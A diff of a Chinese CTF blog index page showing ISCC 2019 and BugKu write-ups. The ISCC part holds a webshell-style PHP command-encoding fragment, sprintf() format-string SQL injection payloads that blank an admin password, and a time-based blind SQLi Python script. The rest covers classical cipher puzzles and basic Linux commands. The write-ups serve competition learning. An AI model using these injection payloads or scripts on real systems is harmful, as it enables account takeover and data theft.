class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phpinfo_str = @base64_encode(@x(@gzcompress(<span class="string">"phpinfo();"</span>),$k));</span><br><span class="line"><span class="keyword">echo</span> $kh.$phpinfo_str.$kf;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b9615a29bc1dTf1I8Rmu+y/+trONN2YioDbg24d0b67c2c91</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/4-1.png" alt="4-1"></p>
+<p>但是直接提交的话，显示的是<code>@base64_encode(@x(@gzcompress($o),$k))</code>处理的内容</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/4-2.png" alt="4-2"></p>
+<p>我们直接将 <code>print(&quot;$p$kh$r$kf&quot;);</code>替换为<code>echo @base64_decode(@x(@gzuncompress($r),$k));</code></p>
+<p>再次<code>POST</code>就成功了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/4-3.png" alt="4-3"></p>
+<h2 id="AWD高地"><a href="#AWD高地" class="headerlink" title="AWD高地"></a>AWD高地</h2><p>题目简化代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>, <span class="string">"security"</span>);</span><br><span class="line">$Profile = sprintf(<span class="string">"password = '%s'"</span>, mysqli_real_escape_string($mysqli, $_GET[<span class="string">'profile'</span>]));</span><br><span class="line">$sql = sprintf(<span class="string">"update users set $Profile where username='%s'"</span>, mysqli_real_escape_string($mysqli, <span class="string">'Dumb'</span>));</span><br><span class="line">var_dump($sql);</span><br><span class="line">$result = $mysqli-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result===<span class="keyword">True</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;h1 style='color:red;'&gt;$mysqli-&gt;error&lt;/h1&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>题目考查的是<code>sprintf()格式化字符串漏洞</code>，详解：<a href="https://blog.csdn.net/weixin_41185953/article/details/80485075" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/80485075</a></p>
+<p>我们传入参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile = %1$&apos;</span><br></pre></td></tr></table></figure>
+<p>经过<code>mysqli_real_escape_string()</code>处理后得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile = %1$\&apos;</span><br></pre></td></tr></table></figure>
+<p>经过第一个<code>sprintf()</code>处理后，<code>$Profile</code>字符串变量的值为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password = &apos;%1$\&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>经过第二个<code>sprintf()</code>处理后，<code>$sql</code>字符串变量的值为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">拼接后：</span><br><span class="line">update users set password = &apos;%1$\&apos;&apos; where username=&apos;Dumb&apos;</span><br><span class="line">这里的%1$\会被吃掉，所以还有一个传入的单引号没有被处理，逃逸出来</span><br><span class="line">处理后：</span><br><span class="line">update users set password = &apos;&apos;&apos; where username=&apos;Dumb&apos;</span><br></pre></td></tr></table></figure>
+<p>所以就造成了注入，比如可以这样构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?profile = %1$\&apos; where username=&apos;admin&apos; #</span><br><span class="line">	↓</span><br><span class="line">$Profile = password = &apos;%1$\&apos; where username=&apos;admin&apos; #&apos;</span><br><span class="line">	↓</span><br><span class="line">$sql = update users set password = &apos;%1$\&apos; where username=&apos;admin&apos; #&apos; where username=&apos;Dumb&apos;</span><br><span class="line">	↓</span><br><span class="line">$sql = update users set password = &apos;&apos; where username=&apos;admin&apos; #&apos; where username=&apos;Dumb&apos;</span><br><span class="line">#修改admin用户的密码为空</span><br></pre></td></tr></table></figure>
+<p>本题exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlinject</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">			sql=<span class="string">f"http://127.0.0.1/test.php?profile=%1$\' where username=0x44756d62 and if(ascii(substr((database()),<span class="subst">&#123;j&#125;</span>,1))=<span class="subst">&#123;i&#125;</span>,sleep(1),0)--+"</span></span><br><span class="line">			ss=time.time()</span><br><span class="line">			res=requests.get(sql)</span><br><span class="line">			<span class="keyword">if</span> time.time()-ss&gt;=<span class="number">0.5</span>:</span><br><span class="line">				<span class="comment">#print(sql)</span></span><br><span class="line">				print(chr(i))</span><br><span class="line"><span class="keyword">if</span> <span class="string">'__main__'</span>==__name__:</span><br><span class="line">	sqlinject()</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF比赛</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/07/26/CTF比赛—2019ISCC线下赛WriteUp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-BugKuCTF—杂项题 第31-40关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -887,108 +1028,6 @@
 
 
   
-    <article id="post-BugKuCTF—加密题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">BugKuCTF — 加密题(第1-10关)</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/" class="archive-article-date">
-  	<time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="第一关（滴答-滴）"><a href="#第一关（滴答-滴）" class="headerlink" title="第一关（滴答~滴）"></a>第一关（滴答~滴）</h3><p>百度一下题目给的数字，发现是摩斯密码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/1-1.png" alt="1-1"></p>
-<p>在线解密一下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/1-2.png" alt="1-2"></p>
-<p>提交就对了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/1-3.png" alt="1-3"></p>
-<hr>
-<h3 id="第二关（聪明的小羊）"><a href="#第二关（聪明的小羊）" class="headerlink" title="第二关（聪明的小羊）"></a>第二关（聪明的小羊）</h3><p>题目提示很明显了：栅栏密码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/2-1.png" alt="2-1"></p>
-<p>用Python写个脚本</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/2-2.png" alt="2-2"></p>
-<p>跑一下flag直接出来</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/2-3.png" alt="2-3"></p>
-<p>也可以使用网站：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码在线加密解密</a></p>
-<hr>
-<h3 id="第三关（ok）"><a href="#第三关（ok）" class="headerlink" title="第三关（ok）"></a>第三关（ok）</h3><p>好多的ok，那么这个就是<strong>Ook!编码</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/3-1.png" alt="3-1"></p>
-<p>找个在线解码网站：<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Brainfuck/Ook在线加密解密</a></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/3-2.png" alt="3-2"></p>
-<p>flag直接解出来</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/3-3.png" alt="3-3"></p>
-<hr>
-<h3 id="第四关（这不是摩斯密码）"><a href="#第四关（这不是摩斯密码）" class="headerlink" title="第四关（这不是摩斯密码）"></a>第四关（这不是摩斯密码）</h3><p>打开看一下，发现是<strong>Brainfuck编码</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[ -&gt;--- ----&lt;</span><br><span class="line">]&gt;--- ----- ----- .&lt;+++ ++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- -----</span><br><span class="line">-&lt;]&gt;. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. &lt;++++ +++[-</span><br><span class="line">&gt;---- ---&lt;] &gt;---- ----. +++++ +..++ +++.+ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++</span><br><span class="line">+[-&gt;+ +++++ +&lt;]&gt;+ ++.++ +.+++ +++++ +.--- -.+++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++++</span><br><span class="line">++.&lt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/4-1.png" alt="4-1"></p>
-<p>那就能继续利用上面哪个网站破解</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/4-2.png" alt="4-2"></p>
-<p>成功解出flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/4-3.png" alt="4-3"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-Misc</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1286,6 +1325,108 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-BugKuCTF—加密题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">BugKuCTF — 加密题(第1-10关)</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/" class="archive-article-date">
+  	<time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="第一关（滴答-滴）"><a href="#第一关（滴答-滴）" class="headerlink" title="第一关（滴答~滴）"></a>第一关（滴答~滴）</h3><p>百度一下题目给的数字，发现是摩斯密码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/1-1.png" alt="1-1"></p>
+<p>在线解密一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/1-2.png" alt="1-2"></p>
+<p>提交就对了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/1-3.png" alt="1-3"></p>
+<hr>
+<h3 id="第二关（聪明的小羊）"><a href="#第二关（聪明的小羊）" class="headerlink" title="第二关（聪明的小羊）"></a>第二关（聪明的小羊）</h3><p>题目提示很明显了：栅栏密码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/2-1.png" alt="2-1"></p>
+<p>用Python写个脚本</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/2-2.png" alt="2-2"></p>
+<p>跑一下flag直接出来</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/2-3.png" alt="2-3"></p>
+<p>也可以使用网站：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码在线加密解密</a></p>
+<hr>
+<h3 id="第三关（ok）"><a href="#第三关（ok）" class="headerlink" title="第三关（ok）"></a>第三关（ok）</h3><p>好多的ok，那么这个就是<strong>Ook!编码</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/3-1.png" alt="3-1"></p>
+<p>找个在线解码网站：<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Brainfuck/Ook在线加密解密</a></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/3-2.png" alt="3-2"></p>
+<p>flag直接解出来</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/3-3.png" alt="3-3"></p>
+<hr>
+<h3 id="第四关（这不是摩斯密码）"><a href="#第四关（这不是摩斯密码）" class="headerlink" title="第四关（这不是摩斯密码）"></a>第四关（这不是摩斯密码）</h3><p>打开看一下，发现是<strong>Brainfuck编码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[ -&gt;--- ----&lt;</span><br><span class="line">]&gt;--- ----- ----- .&lt;+++ ++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- -----</span><br><span class="line">-&lt;]&gt;. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. &lt;++++ +++[-</span><br><span class="line">&gt;---- ---&lt;] &gt;---- ----. +++++ +..++ +++.+ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++</span><br><span class="line">+[-&gt;+ +++++ +&lt;]&gt;+ ++.++ +.+++ +++++ +.--- -.+++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++++</span><br><span class="line">++.&lt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/4-1.png" alt="4-1"></p>
+<p>那就能继续利用上面哪个网站破解</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/4-2.png" alt="4-2"></p>
+<p>成功解出flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/4-3.png" alt="4-3"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-Misc</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">展开全文 >></a>
         </p>
       
 
@@ -1762,214 +1903,9 @@
 
 
   
-    <article id="post-Kali学习笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/03/15/Kali学习笔记/">Kali学习笔记</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/03/15/Kali学习笔记/" class="archive-article-date">
-  	<time datetime="2019-03-14T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1. 常用命令"></a>1. 常用命令</h2><p><strong>grep</strong>：就前面执行后显示的内容进行筛选（egrep相反）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令 | grep ["XXX"]</span><br></pre></td></tr></table></figure>
-<p><strong>awk</strong>：筛选第X行的内容</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令 | awk ["X"]</span><br></pre></td></tr></table></figure>
-<p><strong>cut</strong>：裁剪内容，-d 表示分割的标志，-f 接第几部分</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令 | cut -d ["X"] -f [X]</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1-3.png" alt="1-3"></p>
-<p><strong>ls</strong>：列出当前目录下内容（Window下是：dir）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls [-l/-a/-h...]</span><br></pre></td></tr></table></figure>
-<p><strong>cd</strong>：切换位置</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd [/etc/passwd]</span><br><span class="line">cd ..	（切换至上一级目录）</span><br></pre></td></tr></table></figure>
-<p><strong>pwd</strong>：查看当前工作目录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
-<p><strong>cat</strong>：查看文件全部内容</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat [/etc/passwd]</span><br></pre></td></tr></table></figure>
-<p><strong>less、more</strong>：一页页查看文件内容（回车翻行、空格翻页）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less [/etc/passwd]	（按Q退出）</span><br><span class="line">more [/etc/passwd]</span><br></pre></td></tr></table></figure>
-<p><strong>tail</strong>：查看文件最后几行（默认10行）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail [-20] [/etc/passwd]</span><br></pre></td></tr></table></figure>
-<p><strong>watch</strong>：隔几秒地刷新所查看文件（结合tail命令）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch -n [2] tail [-20] [/var/log/messages]</span><br></pre></td></tr></table></figure>
-<p><strong>rm</strong>：删除（删除目录需要加 -r 参数）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm [file_name]</span><br><span class="line">rm -r [directory_name]</span><br></pre></td></tr></table></figure>
-<p>cp：拷贝（删除目录需要加 -r 参数）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp [target_file_name] [new_file_name]	(在本目录下复制)</span><br><span class="line">cp -r [target_directory_name] [new_directory_name]</span><br><span class="line"></span><br><span class="line">cp [target_file_name] [destination_directory_name]	（复制到执行目录）</span><br><span class="line">cp -r [target_file_name] [destination_directory_name]</span><br></pre></td></tr></table></figure>
-<p>top：监视系统性能参数</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure>
-<p>ps：显示进程信息（通常使用ps -ef或ps auf显示更详细的）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -[ef]</span><br></pre></td></tr></table></figure>
-<p>ifconfig：查看网卡信息</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-<p>netstat：查看简历网络连接的详细信息</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -[nao]</span><br></pre></td></tr></table></figure>
-<p>dpkg：软件的安装、更新和移除。具体用法请百度</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dppkg -[i/L]</span><br></pre></td></tr></table></figure>
-<p>find：查找文件或者目录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name [file_name/directory_name]</span><br><span class="line">find / -iname [file_name/directory_name]	(加i不区分大小写)</span><br></pre></td></tr></table></figure>
-<p>whereis：功能与find相同，但是范围小速度快</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis [file_name/directory_name]</span><br></pre></td></tr></table></figure>
-<p>touch：创建一个文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch [file_name]</span><br></pre></td></tr></table></figure>
-<p>vi：编辑一个文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi [file_name]</span><br></pre></td></tr></table></figure>
-<p>如果想让文本显示行号.就在命令行 模式下,在文本最后输入”:set nu”命令.就可以了 </p>
-<p>如果要想编辑文本文件.必须要转换到插入模式下,也就是按一下键盘上的”i”就可以了.这样你就可以编辑文本,删除文本中的内容</p>
-<p>输入你要输入的内容.如果你想退出文本编辑模式.并且保存刚刚编辑的文本.首先点击一下键盘上的”ESC”,然后输入”:wq!”这样就将文本保存了.然后推出了vi编辑器.如果不想保存就按一下键盘上的”ESC”,输入”:q!”.如果你不确定是否成功.可以通过”cat filename” 命令来查看.</p>
-<p>查找：用”/“加上要查找的内容.例如”/hello”或者是”?hello”也是可以的.</p>
-<p>替换：「r」：替换光标所在处的字符。 ,按一下”r”然后输入要即可.　　「R」：替换光标所到之处的字符，直到按下「ESC」键为止。</p>
-<p>恢复上一次操作：「u」：如果您误执行一个命令，可以马上按下「u」，回到上一个操作。按多次”u”可以执行多次恢复.就相当于”CTRL +Z”的操作.</p>
-<p>光标的移动除了键盘上的上下左右键.也可以是小写模式下,按键盘上的”h,j,k,l”,</p>
-<p>“ctrl+b”:屏幕往后移动一页；”ctrl+f”:屏幕往前移动一页；”ctrl+u”:屏幕往后移动半页；”ctrl+d”:屏幕往前移动半页</p>
-<p>输入任何一个整数，然后输入”shift+G” 就可以到这一页的开头了</p>
-<p>按键盘上的大写”G”移动到文章的最后</p>
-<p>按”$”符号将光标移动到行尾</p>
-<p>“^”将光标移到行头；”w”:将光标移到下一行头；”b”:跟”w”相反.移到上一行行头；”e”:将光标移到下一行尾</p>
